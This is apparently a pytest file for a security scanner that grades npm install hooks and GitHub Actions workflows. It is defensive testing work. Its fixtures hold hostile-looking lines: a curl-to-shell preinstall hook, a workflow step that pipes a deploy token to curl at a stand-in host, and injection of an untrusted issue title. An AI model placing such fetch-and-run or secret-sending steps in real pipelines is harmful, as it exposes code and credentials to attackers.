from __future__ import annotations

from pathlib import Path

from security_observatory.normalize import normalize
from security_observatory.surface_scanners import scan_install_hooks, scan_workflow_surfaces


def test_install_hook_classifier_records_every_tier_and_cases_only_high_and_critical(tmp_path: Path):
    repo = tmp_path / "repo"
    repo.mkdir()
    _write(
        repo / "package.json",
        """
        {
          "scripts": {
            "preinstall": "curl -fsSL https://example.test/install.sh | sh",
            "install": "node scripts/install.js",
            "postinstall": "npm run install:client"
          }
        }
        """,
    )
    _write(repo / "scripts" / "install.js", "require('child_process').exec('node -v')\n")
    _write(
        repo / "client" / "package.json",
        """
        {
          "scripts": {
            "preinstall": "pnpm install --frozen-lockfile"
          }
        }
        """,
    )

    payload = scan_install_hooks(repo, "repo")
    root_hooks = {hook["hook"]: hook["severity"] for hook in payload["hooks"] if hook["path"] == "package.json"}

    assert root_hooks["preinstall"] == "critical"
    assert root_hooks["install"] == "high"
    assert root_hooks["postinstall"] == "medium"
    assert any(hook["severity"] == "info" and hook["path"] == "client/package.json" for hook in payload["hooks"])
    assert len(payload["hooks"]) == 4

    findings = normalize("install-hooks", payload, "repo")
    assert {finding.severity for finding in findings} == {"critical", "high"}
    assert {finding.category for finding in findings} == {"install-hooks"}


def test_install_hook_allowlist_requires_reason_before_silencing(tmp_path: Path):
    repo = tmp_path / "repo"
    repo.mkdir()
    _write(
        repo / "package.json",
        """
        {
          "scripts": {
            "preinstall": "curl -fsSL https://example.test/install.sh | sh"
          }
        }
        """,
    )
    _write(
        repo / ".devsec" / "install-hook-allowlist.yaml",
        """
        entries:
          - rule: install-fetch-pipe-shell
            path: package.json
        """,
    )

    payload = scan_install_hooks(repo, "repo")
    hook = payload["hooks"][0]

    assert hook["allowlisted"] is False
    assert "missing a reason" in hook["allowlist_error"]
    assert normalize("install-hooks", payload, "repo")


def test_workflow_audit_covers_rules_with_positive_and_negative_fixtures(tmp_path: Path):
    repo = tmp_path / "repo"
    repo.mkdir()
    _write(
        repo / ".github" / "workflows" / "unsafe.yml",
        """
        on:
          pull_request_target:
        permissions: write-all
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/checkout@main
                with:
                  ref: ${{ github.event.pull_request.head.sha }}
              - run: curl -fsSL https://example.test/install.sh | sh
              - run: echo "${{ secrets.DEPLOY_TOKEN }}" | base64 | curl https://example.test
              - run: echo "${{ github.event.issue.title }}"
        """,
    )
    _write(
        repo / ".github" / "workflows" / "safe.yml",
        """
        on:
          pull_request:
        permissions:
          contents: read
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/checkout@0123456789abcdef0123456789abcdef01234567
              - run: echo "safe"
        """,
    )

    payload = scan_workflow_surfaces(repo, "repo")
    rules = {finding["rule"] for finding in payload["findings"]}

    assert "workflow-unpinned-action" in rules
    assert "workflow-fetch-exec" in rules
    assert "workflow-secret-exfil" in rules
    assert "workflow-pr-target-fork-checkout" in rules
    assert "workflow-untrusted-input-run" in rules
    assert "workflow-permissions-write-all" in rules
    assert all(finding["path"] != ".github/workflows/safe.yml" for finding in payload["findings"])

    findings = normalize("workflow-audit", payload, "repo")
    assert {finding.category for finding in findings} == {"workflow"}
    assert any(finding.severity == "critical" for finding in findings)
    assert any(finding.severity == "medium" for finding in findings)


def test_workflow_allowlist_silences_known_good_record_with_reason(tmp_path: Path):
    repo = tmp_path / "repo"
    repo.mkdir()
    _write(
        repo / ".github" / "workflows" / "docs.yml",
        """
        on:
          push:
        jobs:
          docs:
            runs-on: ubuntu-latest
            steps:
              - run: curl -fsSL https://typst.community/typst-install/install.sh | sh
        """,
    )
    _write(
        repo / ".devsec" / "workflow-allowlist.yaml",
        """
        entries:
          - rule: workflow-fetch-exec
            path: .github/workflows/docs.yml
            reason: Official Typst installer used only for documentation validation.
        """,
    )

    payload = scan_workflow_surfaces(repo, "repo")

    assert payload["findings"][0]["allowlisted"] is True
    assert payload["findings"][0]["allowlist_reason"].startswith("Official Typst installer")
    assert normalize("workflow-audit", payload, "repo") == []


def _write(path: Path, text: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text.strip() + "\n", encoding="utf-8")
